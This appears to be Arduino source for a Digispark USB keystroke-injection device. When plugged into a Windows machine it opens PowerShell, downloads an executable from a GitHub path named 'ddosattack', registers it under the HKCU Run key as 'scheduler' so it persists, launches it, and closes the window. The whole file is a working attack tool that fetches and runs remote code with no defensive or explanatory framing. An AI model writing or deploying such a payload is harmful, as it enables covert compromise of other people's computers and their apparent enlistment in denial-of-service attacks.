#include <DigiKeyboard.h>

void setup() {
  //line 5-10 launches powershell
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);

  //line 12-16 downloads the .exe file
  DigiKeyboard.print("Invoke/WebRequest /Uri https>&&raw.githubusercontent.com&Fred/the/bot&ddosattack&master&main.exe /OutFile .");
  DigiKeyboard.sendKeyStroke(0x64, MOD_ALT_RIGHT); // sends a "\"
  DigiKeyboard.print("main.exe<");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  //line 19-48 sets the exe file to launch with windows.
  DigiKeyboard.sendKeyStroke(0x21, MOD_ALT_RIGHT); //Dollar sign
  DigiKeyboard.print("paths ) ");
  DigiKeyboard.sendKeyStroke(0x21, MOD_ALT_RIGHT); //Dollar sign
  DigiKeyboard.print("PWD.path");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(0x21, MOD_ALT_RIGHT); //Dollar sign
  DigiKeyboard.print("paths -) ");
  DigiKeyboard.sendKeyStroke(0x1F, MOD_SHIFT_LEFT); //Goosefeet
  DigiKeyboard.sendKeyStroke(0x64, MOD_ALT_RIGHT); // sends a "\"
  DigiKeyboard.print("main.exe");
  DigiKeyboard.sendKeyStroke(0x1F, MOD_SHIFT_LEFT); //Goosefeet
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(0x1F, MOD_SHIFT_LEFT); //Goosefeet
  DigiKeyboard.print("HKCU>");
  DigiKeyboard.sendKeyStroke(0x64, MOD_ALT_RIGHT); // sends a "\"
  DigiKeyboard.print("Software");
  DigiKeyboard.sendKeyStroke(0x64, MOD_ALT_RIGHT); // sends a "\"
  DigiKeyboard.print("Microsoft");
  DigiKeyboard.sendKeyStroke(0x64, MOD_ALT_RIGHT); // sends a "\"
  DigiKeyboard.print("Windows");
  DigiKeyboard.sendKeyStroke(0x64, MOD_ALT_RIGHT); // sends a "\"
  DigiKeyboard.print("CurrentVersion");
  DigiKeyboard.sendKeyStroke(0x64, MOD_ALT_RIGHT); // sends a "\"
  DigiKeyboard.print("Run");
  DigiKeyboard.sendKeyStroke(0x1F, MOD_SHIFT_LEFT); //Goosefeet
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_SHIFT_LEFT);
  DigiKeyboard.print("/Name scheduler");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(0x21, MOD_ALT_RIGHT); //Dollar sign
  DigiKeyboard.print("paths");

  //line 51-56 launches the exe file and closes the powershell window
    DigiKeyboard.print(".");
    DigiKeyboard.sendKeyStroke(0x64, MOD_ALT_RIGHT);
    DigiKeyboard.print("main.exe");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.print("exit");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
}

void loop() {

}

// remove the 5 sec delay that is present when inserted into computer
